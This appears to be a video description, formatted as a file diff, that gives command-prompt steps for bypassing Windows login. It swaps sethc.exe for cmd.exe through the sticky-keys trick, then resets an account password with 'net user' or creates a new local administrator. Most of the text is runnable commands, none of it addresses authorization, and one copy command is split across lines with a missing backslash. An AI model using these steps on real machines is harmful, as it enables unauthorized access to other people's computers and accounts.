@@ -1,0 +1,31 @@
+In this video I will explain how to remove Windows passwords or access an account without removing a password, using only the command prompt, by using a bootable command prompt to replace the sticky keys function with a command prompt and then using the net user command to remove the password.
+
+Please Like and Subscribe.
+
+Commands
+
+-Replacing sticky keys-
+
+diskpart
+
+list vol
+
+exit
+
+copy c:\windows\system32\sethc.exe c:\
+
+copy c:\windows\system32\cmd.exe 
+
+c:windows\system32\sethc.exe
+
+exit
+
+-Destructive method.-
+
+net user (username) *
+
+-Non Destructive method-
+
+net user (username) /add
+
+net localgroup administrators (username) /add
